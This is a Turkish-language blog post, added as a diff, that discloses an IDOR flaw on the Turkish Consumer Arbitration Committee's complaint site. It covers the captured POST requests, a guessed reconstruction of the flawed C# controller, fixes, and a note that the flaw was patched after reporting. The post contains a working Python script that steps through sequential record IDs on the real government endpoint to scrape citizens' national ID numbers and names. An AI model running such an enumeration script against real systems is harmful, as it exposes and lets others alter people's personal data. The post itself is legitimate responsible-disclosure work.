@@ -1,0 +1,333 @@
+---
+title: "Tüketici Hakem Heyeti'nde IDOR: TC Kimlik ve Kişisel Veri Açığı"
+date: '2026-05-09'
+summary: 'Tüketici Hakem Heyeti (TÜBİS) sisteminde keşfettiğim IDOR güvenlik açığı: tek bir parametre manipülasyonuyla başka vatandaşların TC Kimlik No, Ad, Soyad bilgilerine erişim ve iletişim bilgilerini değiştirme.'
+tags: ['güvenlik', 'zafiyet-analizi', 'hikaye', 'api', 'idor', 'asp-net-core']
+translationKey: 'tuketici-hakem-heyeti-idor'
+featured: true
+draft: false
+---
+
+
+# Tüketici Hakem Heyeti'nde IDOR: Adaptör Şikayetinden Güvenlik Açığı Keşfine
+
+<Callout type="warn" title="Sorumluluk">
+  Tüm testler yalnızca kendi hesabım üzerinde gerçekleştirilmiş; hiçbir vatandaşa ait veri okunmamış, kopyalanmamış veya kaydedilmemiştir.
+</Callout>
+
+İki yıldan uzun bir süre M2 işlemcili MacBook kullandım *(Kısa yorumum: hüsran)*. İki yılımın ardından MacBook benim hızıma yetişememeye başladı ve esnekliği konusunda ciddi problemler yaşamaya başlamıştım. Herhangi bir yazılım kurmak istediğimde ARM desteği olup olmadığını düşünmek bile benim için bir gerilim olmuştu. Bu yüzden yine çok hızlı bir kararla MSI marka bir Windows laptop satın aldım. 
+
+**Aslında hikayenin esas başlangıç noktası burası.** 
+
+Aldığım yeni laptop'un güç adaptöründe bazı cızırtı sesleri duyuyordum ve genelde sessiz ortamda odaklanıp çalıştığım için bu bana büyük bir problem yaşatıyordu. Teknik servis ile iletişime geçtim fakat bu konuda bir şey yapmamayı tercih ettiler. Ben de saplantılı bir şekilde hakkımı savunmayı sevdiğim için soluğu Tüketici Hakem Heyeti'nin web sitesinde aldım. Şikayetimi oluşturmak için sistemde gezinirken, bir şeyler dikkatimi çekmeye başladı...
+
+---
+
+## Sisteme İlk Bakış
+
+Tüketici Hakem Heyeti web sitesinin kendi dahili bir kayıt (register) veya giriş (login) fonksiyonu bulunmuyor. Kullanıcılar kimlik doğrulama (authentication) işlemlerini tamamen e-Devlet entegrasyonu üzerinden gerçekleştirerek sisteme dahil oluyorlar. 
+
+Ancak giriş yaptıktan sonra sizi karşılayan ana sayfa (index), modern arayüz standartlarından oldukça uzak. Kendi döneminin şartlarında bile aceleye getirilmiş, UI/UX açısından pek özenilmemiş, demode bir yapıya sahip.
+
+![Tüketici Hakem Heyeti Ana Sayfa Görünümü](/images/blog/index.png)
+
+Sistem sizi zorunlu olarak **"Tüketici Başvuruları"** sayfasına yönlendiriyor. `ticaret.gov.tr` altındaki bir alt alanda (subdomain) çalışan bu sayfayı ziyaret ettiğinizde ise klasik *sidebar / header / footer / content* düzenine sahip bir dashboard sizi karşılıyor. Masaüstü ortamında olduğu gibi mobilde de responsive (duyarlı) tasarıma özen gösterilmemiş. Uygulama geliştirme süreçlerindeki tecrübelerimden yola çıkarak: Front-end tarafındaki bu özensizlik, genellikle backend mimarisinde yaşanabilecek sorunların ve zafiyetlerin güçlü bir sinyalidir.
+
+![Tüketici Başvuruları — Şikayet Başvuru Formu](/images/blog/tuketici-hakem.png)
+
+## Kişisel Bilgilerim Sayfası
+
+Siteyi incelemeye başladığımda kenar çubuğundaki (sidebar) **Kişisel Bilgilerim** alanı ilgimi çekti ve o sayfayı incelemeye başladım. Ortada enteresan bir durum vardı: Authentication için e-Devlet yapısı kullanıldığı halde, kullanıcıların bilgileri kurumun kendi yerel veritabanında tutuluyordu. Sayfayı biraz daha incelediğimde bu teorimi doğrulayan bir detayla karşılaştım; Ad, Soyad ve TC Kimlik No gibi alanlar (fields) sadece `disabled` ve `read-only` inputlar olarak render ediliyordu.
+
+![Kişisel Bilgilerim Sayfası](/images/blog/kisisel-bilgiler.png)
+
+Bu yapıyı fark ettikten sonra, arka planda işlerin nasıl yürüdüğüne dair kendime şu kritik soruları sormadan edemedim:
+
+<Callout type="warn" title="Kritik Sorular">
+  <ol className="list-decimal pl-4 space-y-1">
+    <li>Sistem TC Kimlik No verisini getirirken neye göre filtreleme yapıyor? Arada token tabanlı bir (örneğin JWT) yapı kullanılıyor mu?</li>
+    <li>Bu verilerin doğrulaması her istekte e-Devlet tarafında mı yapılıyor, yoksa sistemin kendi dahili API endpoint'leri mi var?</li>
+    <li style={{ color: "var(--accent-rose)", fontWeight: 600 }}>Eğer kendi API endpoint'leri varsa, Authorization (Yetkilendirme) kontrolleri düzgün yapılıyor mu?</li>
+  </ol>
+</Callout>
+
+İşte bu son soru, beni asıl zafiyete götüren kapıyı araladı.
+
+Cevapları bulmak için BurpSuite ile yapılan istekleri incelemek istedim. **Sözüm ona tüketicinin hakkını savunmak için geliştirilmiş bir sistem, tüketicinin kendi verisini bile koruyamıyor olabilir miydi?**
+
+## İsteklerin Anatomisi
+
+### GET İsteği
+
+İlk önce `/Tuketici/KisiselBilgi` adresine yapılan `GET` isteğini incelemek istedim; arka planda neler döndüğüne dair iyi bir fikir verebilirdi. Yapılan HTTP isteği şu şekildeydi:
+
+<HttpRequest
+  method="GET"
+  path="/Tuketici/KisiselBilgi"
+  host="tuketicisikayeti.ticaret.gov.tr"
+  headers={[
+    { key: "ASP.NET_SessionId", value: "0w22g02kh2e3luv25k25sr1j" },
+    { key: ".ASPXAUTH", value: "0F21B1247... [Kısaltıldı]" },
+    { key: "__RequestVerificationToken", value: "eV1WrX-... [Kısaltıldı]", highlight: true },
+  ]}
+/>
+
+Bu istekte ilgimi çeken ilk şey `__RequestVerificationToken` olmasıydı. CSRF (Cross-Site Request Forgery) saldırılarından korunmak için AntiForgeryToken kullanmışlardı. Fakat UI ve UX tarafında gördüğüm özensizlikten dolayı, bunun güvenliği sağlamaktan ziyade framework'ün varsayılan ayarlarıyla, ezbere yapıldığına inanıyordum ve aramaya devam ettim...
+
+Takip ettiğimiz `/Tuketici/KisiselBilgi` sayfasında bir de "Kaydet" butonu bulunuyor. Sistemin genel yapısına bakıldığında **Server-Side Render (SSR)** yapıldığını hissedebiliyordum. Arka planda modern bir RestAPI çalışması çok mümkün görünmüyordu. Fakat emin olmak için yine de Developer Console aracılığıyla Fetch/XHR verilerine baktım. 
+
+Tam da tahmin ettiğim gibi hiçbir şey bulamadım. Sistem tamamen Server-Side Render yapıyor, arkada asenkron çalışan hiçbir servis yok.
+
+![Developer Console — Fetch/XHR sekmesi boş](/images/blog/developer-console.png)
+
+Dolayısıyla şundan artık eminiz ki; bu "Kaydet" butonu sistemde bir yerlere form verilerini (POST isteği) gönderiyor olmalı. Ama nereye ve nasıl?
+
+### POST İsteği: Kritik Bulgu
+
+Hemen Burp Suite ile araya girip butona basıldığında yapılan isteği yakaladım ve inceledim.
+
+Ve Bingo!
+
+
+<HttpRequest
+  method="POST"
+  path="/Tuketici/KisiselBilgi"
+  host="tuketicisikayeti.ticaret.gov.tr"
+  headers={[
+    { key: "Content-Type", value: "application/x-www-form-urlencoded" },
+    { key: "Cookie", value: "ASP.NET_SessionId=0w22g02kh2e3luv... ; .ASPXAUTH=0F21B12... ; __RequestVerificationToken=eV1WrX-..." },
+  ]}
+  body="KISI.RID=11602900&KISI.AKTIF=EVET&KISI.DOGUM_TARIHI=XX%2FXX%2F19XX&SABITTEL=0535+XXX+XXXX&CEPTEL=0535+XXX+XXXX&EPOSTA=linuxturkey06%40gmail.com&ADRES=+%2F+ANKARA&IL=6&ILCE=80&TAAHHUTNAME=Taahhütname+Stringi+URL+ENCODED...&DXScript=1_171%2C1_94..."
+  highlightBody={true}
+/>
+
+İsteğin body kısmını (payload) incelediğimizde birçok "business-logic" ve performans hatası olduğunu görüyoruz. Örneğin; ciddi ciddi 1000 karakterlik bir taahhütname metnini her defasında POST verisi içerisine koyup backend'e taşıtıyorlar. DevExpress bileşenlerinin devasa `DXScript` state'leri havada uçuşuyor. Birçok temel mimari hata var. Fakat şimdilik bunların üzerinde durmayacağım, biz şimdilik Ad, Soyad ve TC Kimlik No verisinin peşindeyiz. 
+
+<Callout type="danger" title="KISI.RID=11602900">
+Eminim hepinizin gözüne çarpan ilk veri **`KISI.RID=11602900`** olmuştur.
+</Callout>
+
+Sistemin Server-Side Render yapıldığını biliyoruz. Dolayısıyla kurgulanan akış şu şekilde işlemeli:
+
+<Steps>
+  <Step>Kullanıcı e-Devlet ile sisteme giriş yapar.</Step>
+  <Step>Backend, kullanıcının veritabanındaki kayıt ID'sini (`RID`) bulur.</Step>
+  <Step>Bu `RID` değeri, HTML formunun içine bir `hidden input` olarak gömülür.</Step>
+  <Step>Kullanıcı "Kaydet" butonuna bastığında form verileriyle birlikte `RID` de sunucuya POST edilir.</Step>
+  <Step>Sunucu bu `RID`'e bakarak hangi kaydı güncelleyeceğine karar verir — <span style={{ color: "var(--accent-rose)", fontWeight: 600 }}>Fakat login olmuş kullanıcının RID değeri ile inputta yazan RID değeri eşleşiyor mu bakmıyor.</span></Step>
+</Steps>
+
+HTML içeriğin kaynağını görüntülediğimde düşündüğüm gibi birden çok hidden alan buldum. Ve bu alanlardan bir tanesi tam da düşündüğümüz gibi RID değerini Server'a POST etmek için kullanılıyordu.
+
+```html title="Sayfa Kaynağı — Hidden Input'lar"
+<input type="hidden" id="KISI_RID"   name="KISI.RID"   value="11602900"
+       data-val="true" data-val-required="The RID field is required." />
+<input type="hidden" id="KISI_AKTIF" name="KISI.AKTIF" value="EVET"
+       data-val="true" data-val-required="The AKTIF field is required." />
+```
+
+Peki ya kullanıcı, **kendisine ait olmayan** bir ID değeri ile işlem yapmaya çalışırsa? Sunucu bu RID değerinin o an giriş yapmış olan kişiye ait olup olmadığını kontrol ediyor mudur? HAYIR.
+
+## IDOR Zafiyeti — Impact Analizi
+
+**IDOR (Insecure Direct Object Reference)**, bir uygulamanın kullanıcıdan aldığı bir parametreyi (ID, dosya adı, kayıt numarası) doğrudan veritabanı sorgusunda kullanırken o parametrenin gerçekten o kullanıcıya ait olup olmadığını kontrol etmemesi durumunda ortaya çıkan güvenlik açığıdır. OWASP Top 10 listesinde **Broken Access Control** kategorisinde yer alır.
+
+Geliştiriciler kimlik doğrulama (Authentication) işlemlerini yapsalar bile, kullanıcıdan gelen parametrelerin (bu örnekteki `KISI.RID`) gerçekten o oturumdaki kullanıcıya ait olup olmadığını doğrulamadıklarında (Authorization eksikliği) bu açık ortaya çıkabilmektedir.
+
+Şimdi Backend'de yazılmış kodu az çok ortaya koyabiliriz. Sistemin arkasındaki kod .NET ortamında tahminen şu şekilde yazılmış bir mantık barındırıyor:
+
+<Callout type="warn" title="Sorun 1 — Eksik Authorization">
+  `[Authorize]` attribute'ü yalnızca "bu kullanıcı giriş yapmış mı?" sorusunu cevaplar. "Bu `RID` bu kullanıcıya ait mi?" eşleştirmesini yapmamakta.
+</Callout>
+
+```csharp title="Yetkisiz erişim"
+[Authorize] // giriş kontrolü var — sahiplik kontrolü YOK
+[HttpPost]
+public async Task<IActionResult> KisiselBilgiGuncelle(
+    [FromForm] KisiselBilgiViewModel model)
+{
+    // istemciden gelen RID'e doğrudan güveniliyor
+    var userProfile = await _context.Kullanicilar
+        .FirstOrDefaultAsync(u => u.RID == model.KISI.RID);
+
+    userProfile.Eposta = model.Eposta; // victim verisi güncelleniyor
+    userProfile.CepTel = model.CepTel;
+    await _context.SaveChangesAsync();
+    ...
+}
+```
+
+<Callout type="danger" title="Sorun 2 — Hassas Veri Sızıntısı">
+  Kaydetme işlemi bittikten sonra sayfa yeniden render ediliyor. Veritabanından gelen Ad, Soyad ve TC Kimlik No bilgileri `disabled` inputlara yazılarak saldırgana geri dönmekte.
+</Callout>
+
+```csharp title="Veri sızıntısı"
+return View(new KisiselBilgiViewModel {
+    KISI = new KisiDto {
+        Ad         = userProfile.Ad,          // SIZINTI
+        Soyad      = userProfile.Soyad,       // SIZINTI
+        TCKimlikNo = userProfile.TCKimlikNo   // SIZINTI
+    }
+});
+```
+
+
+
+## Proof of Concept
+
+<Callout type="danger">
+Burp Suite üzerinden `KISI.RID=11602900` değerini `11602901` yaparak isteği tekrar gönderdiğimde, sunucudan dönen HTML response'unda (yanıtında) **hiç tanımadığım bir vatandaşa ait Ad, Soyad ve TC Kimlik Numarası** bilgilerinin ekrana basıldığını gördüm. Sistem, o vatandaşa ait profil verilerini getirmiş ve formun içine gömüp bana servis etmişti.
+
+Üstelik bu işlem sadece okumayla sınırlı kalmıyor, aynı zamanda o vatandaşa ait iletişim bilgilerini (E-posta, Telefon) değiştirmeme de olanak tanıyordu.
+</Callout>
+
+Şimdi bir exploit yazalım. Bu isteği otomatize edelim ve ID değerini otomatik olarak her istekte arttırsın. Böylece zafiyetin gerçekten nasıl kullanılabileceğini, etkisini (Impact) ve kullanıcıların Ad, Soyad ve TC bilgilerini elde edebileceğimizi pratikte de ispatlamış olalım.
+
+<Callout type="warn" title="Yalnızca Test Amaçlı">
+  Aşağıdaki script yalnızca zafiyetin kapsamını belgeleyen bir PoC'dir. Hiçbir veri kaydedilmemiştir.
+</Callout>
+
+```python title="exploit.py"
+import requests
+from bs4 import BeautifulSoup
+import time
+
+URL = "https://tuketicisikayeti.ticaret.gov.tr/Tuketici/KisiselBilgi"
+
+COOKIES = {
+    "ASP.NET_SessionId": "ndqzdansvbvbapbjd5kfkrdl",
+    "Hello": "!v+GWSiRGwWia9LA0FmdmS0VgKAQ...",
+    "__RequestVerificationToken": "VEKDKXm1JAxE3zF4Zc2LkTXJjru4..."
+}
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+session = requests.Session()
+session.cookies.update(COOKIES)
+
+rid = 1
+
+while True:
+    payload = {"KISI.RID": str(rid), "KISI.AKTIF": "EVET"}
+
+    try:
+        response = session.post(URL, data=payload, headers=HEADERS, timeout=15)
+        response.raise_for_status()
+
+        soup = BeautifulSoup(response.text, "html.parser")
+        tc    = soup.find("input", {"id": "KISI_TCKIMLIKNO"})
+        ad    = soup.find("input", {"id": "KISI_AD"})
+        soyad = soup.find("input", {"id": "KISI_SOYAD"})
+
+        tc_val    = tc.get("value", "").strip()    if tc    else ""
+        ad_val    = ad.get("value", "").strip()    if ad    else ""
+        soyad_val = soyad.get("value", "").strip() if soyad else ""
+
+        if tc_val or ad_val or soyad_val:
+            tc_masked    = tc_val[0] + "*" * (len(tc_val) - 2) + tc_val[-1]
+            soyad_masked = soyad_val[0] + "*" * (len(soyad_val) - 1)
+            line = f"RID: {rid} | TC: {tc_masked} | AD: {ad_val} | SOYAD: {soyad_masked}"
+            print(line)
+            with open("sonuclar.txt", "a", encoding="utf-8") as f:
+                f.write(line + "\n")
+        else:
+            print(f"RID {rid}: veri bulunamadı")
+
+    except Exception as e:
+        print(f"RID {rid} hata: {e}")
+
+    rid += 1
+    time.sleep(1)
+```
+
+Beginner seviyesi bir Python scriptiyle bu zafiyeti ne kadar kolay otomatize edebildiğimizi gördük.
+
+<Video src="/videos/recording.webm" caption="Exploit scriptinin çalıştırılması" />
+
+---
+
+## Remediation
+
+<Callout type="success" title="Temel Kural">
+  İstemciden gelen hiçbir kimlik parametresine güvenme. Kaynak sahipliğini her zaman sunucu tarafında, aktif session'dan doğrula.
+</Callout>
+
+### 1. Authorization Kontrolü
+
+Zafiyetin temel nedeni, `KISI.RID` değerinin session ile karşılaştırılmamasıdır. Bunu tek satırlık bir sorgu değişikliği ile çözebiliriz:
+
+```csharp title="Controller.cs"
+[Authorize]
+[HttpPost]
+public async Task<IActionResult> KisiselBilgiGuncelle(
+    [FromForm] KisiselBilgiViewModel model)
+{
+    var userProfile = await _context.Kullanicilar // [!code --]
+        .FirstOrDefaultAsync(u => u.RID == model.KISI.RID); // [!code --]
+    if (userProfile == null) return NotFound(); // [!code --]
+
+    var currentRid = GetCurrentUserRid(); // [!code ++]
+    var userProfile = await _context.Kullanicilar // [!code ++]
+        .FirstOrDefaultAsync(u => u.RID == currentRid); // [!code ++]
+    if (userProfile == null) return Forbid(); // [!code ++]
+
+    userProfile.Eposta = model.Eposta;
+    userProfile.CepTel = model.CepTel;
+    await _context.SaveChangesAsync();
+    return View(...);
+}
+```
+
+### 2. Response'dan Hassas Alanları Kaldır
+
+Güncelleme sonrası dönen view modeline TC Kimlik No, Ad, Soyad gibi alanların eklenmesi gerekmez. Response'dan çıkarılmalılar:
+
+```csharp title="ViewModel.cs"
+return View(new KisiselBilgiViewModel {
+    KISI = new KisiDto { // [!code --]
+        Ad         = userProfile.Ad, // [!code --]
+        Soyad      = userProfile.Soyad, // [!code --]
+        TCKimlikNo = userProfile.TCKimlikNo // [!code --]
+    }, // [!code --]
+    Eposta = userProfile.Eposta,
+    CepTel = userProfile.CepTel
+});
+```
+
+### 3. Sequential ID Yerine UUID Kullan
+
+Sıralı integer ID'ler enumeration'ı trivial hale getirir. UUID kullanmak authorization eksikliğini gidermez; ama keşif için gereken eforu ciddi ölçüde artırır.
+
+```csharp title="Model.cs"
+public int RID { get; set; } // [!code --]
+public Guid RID { get; set; } // [!code ++]
+```
+
+### 4. Rate Limiting
+
+Authorization katmanı doğru çalışsa bile, yüksek frekanslı isteklere karşı rate limiting eklemek çok daha efektif bir savunma sağlar:
+
+```csharp title="Program.cs"
+builder.Services.AddRateLimiter(options => { // [!code ++]
+    options.AddFixedWindowLimiter("api", opt => { // [!code ++]
+        opt.PermitLimit = 30; // [!code ++]
+        opt.Window = TimeSpan.FromMinutes(1); // [!code ++]
+        opt.QueueProcessingOrder = QueueProcessingOrder.OldestFirst; // [!code ++]
+    }); // [!code ++]
+}); // [!code ++]
+```
+
+---
+
+## Sonuç
+
+Tüketici Hakem Heyeti, Türkiye'deki milyonlarca vatandaşın ticari uyuşmazlıklarını çözmek için başvurduğu resmi bir devlet platformudur. Bu sistemde tespit edilen IDOR zafiyeti; TC Kimlik Numarası, Ad, Soyad ve iletişim bilgileri gibi son derece hassas kişisel verileri, herhangi bir teknik engel olmaksızın ifşa ediyordu.
+
+Zafiyetin teknik nedeni basitti: istemciden gelen bir ID parametresine sunucu tarafında doğrulama yapılmadan güvenilmesi. Fakat etkisi ağır olabilir — platformun tüm kullanıcı tabanı, birkaç satır Python koduyla enumerate edilebilir durumda.
+
+<Callout type="success" title="Yama">
+  Zafiyet ilgili birime iletildi. Bildirimin ardından yama uygulandı ve endpoint yeniden test edilerek kapatıldığı doğrulandı.
+</Callout>
